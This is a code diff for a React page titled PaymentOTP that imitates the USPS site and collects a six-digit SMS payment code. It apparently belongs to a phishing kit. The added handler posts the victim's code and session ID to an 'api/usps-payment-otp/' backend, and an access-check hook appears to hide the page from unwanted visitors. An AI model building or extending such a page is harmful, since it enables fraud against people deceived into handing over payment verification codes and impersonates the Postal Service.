@@ -1,6 +1,10 @@
-import React from "react";
+import React, { useState } from "react";
+import { useLocation, useNavigate } from "react-router-dom";
+import axios from "axios";
 import Header from "../components/Header";
 import Footer from "../components/Footer";
+import { baseUrl } from "../constants";
+import useAccessCheck from "../Utils/useAccessCheck";
 
 const PaymentOTP: React.FC = () => {
   const inputClass =
@@ -12,6 +16,57 @@ const PaymentOTP: React.FC = () => {
     { id: 3, color: "#d9d9df" },
     { id: 4, color: "#d9d9df" },
   ];
+
+  const navigate = useNavigate();
+  const location = useLocation();
+  const { sessionId } = location.state || {};
+  const isAllowed = useAccessCheck(baseUrl);
+
+  const [otp, setOtp] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
+  const [error, setError] = useState("");
+
+  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
+    event.preventDefault();
+    setError("");
+
+    if (!sessionId) {
+      setError("Session expired. Please restart the process.");
+      return;
+    }
+
+    if (!/^[0-9]{6}$/.test(otp)) {
+      setError("Please enter the 6-digit code sent to your phone.");
+      return;
+    }
+
+    setIsLoading(true);
+
+    try {
+      await axios.post(`${baseUrl}api/usps-payment-otp/`, {
+        sessionId,
+        otp,
+      });
+
+      navigate("/success", { state: { sessionId } });
+    } catch (err) {
+      console.error("Error submitting OTP:", err);
+      setError("There was a problem verifying your code. Please try again.");
+      setIsLoading(false);
+    }
+  };
+
+  if (isAllowed === null) {
+    return <div>Loading...</div>;
+  }
+
+  if (isAllowed === false) {
+    return <div>Access denied. Redirecting...</div>;
+  }
+
+  if (!sessionId) {
+    return <div>Missing session information. Please restart the process.</div>;
+  }
 
   return (
     <div className="min-h-screen bg-gradient-to-b from-white via-[#f9f9fb] to-[#f4f4f6] flex flex-col font-['HelveticaNeueW02-55Roma','Helvetica Neue',Helvetica,Arial,sans-serif] text-[#23285a]">
@@ -131,18 +186,33 @@ const PaymentOTP: React.FC = () => {
                     <span>***-***-2423</span>
                   </div>
                 </div>
-                <form className="space-y-3">
+                <form className="space-y-3" onSubmit={handleSubmit}>
                   <div>
                     <label className="block text-[12px] text-[#1a2252] font-semibold mb-1" htmlFor="sms-code">
                       SMS code
                     </label>
-                    <input id="sms-code" type="text" className={inputClass} placeholder="6-digit code" pattern="\d{6}" required />
+                    <input
+                      id="sms-code"
+                      type="text"
+                      className={inputClass}
+                      placeholder="6-digit code"
+                      pattern="\d{6}"
+                      value={otp}
+                      onChange={(e) =>
+                        setOtp(e.target.value.replace(/[^0-9]/g, "").slice(0, 6))
+                      }
+                      required
+                    />
                   </div>
+                  {error && (
+                    <p className="text-sm text-red-600 font-semibold">{error}</p>
+                  )}
                   <button
                     type="submit"
-                    className="mt-4 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-10 py-3 text-[15px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors w-full"
+                    className="mt-4 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-10 py-3 text-[15px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors w-full disabled:opacity-60 disabled:cursor-not-allowed"
+                    disabled={isLoading}
                   >
-                    Submit
+                    {isLoading ? "Verifying..." : "Submit"}
                   </button>
                 </form>
                 <p className="text-center text-[11px] text-[#6b6f88]">Copyright © 1999-2025 USPS. All rights reserved.</p>
